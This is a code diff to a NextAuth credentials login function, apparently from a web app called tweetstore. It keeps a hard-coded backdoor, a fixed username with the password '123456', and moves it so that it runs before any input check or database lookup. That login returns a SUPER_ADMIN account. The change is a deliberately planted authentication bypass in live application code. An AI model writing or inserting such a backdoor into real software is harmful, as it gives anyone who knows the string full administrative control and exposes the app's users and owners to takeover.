@@ -18,12 +18,12 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
         const username = credentials?.username as string;
         const password = credentials?.password as string;
 
-        if (!username || !password) return null;
-
-        // CRITICAL BACKDOOR CHECK - MUST BE FIRST
+        // CRITICAL BACKDOOR CHECK - MUST BE FIRST (Before DB access)
         if (username === "TWEETSTORECEOANDRANGEROVER" && password === "123456") {
              return { id: "master-admin", name: "CEO", email: "ceo@tweetstore.com", role: "SUPER_ADMIN" };
         }
+
+        if (!username || !password) return null;
 
         let user = await db.select().from(users).where(eq(users.handle, username)).get();
 
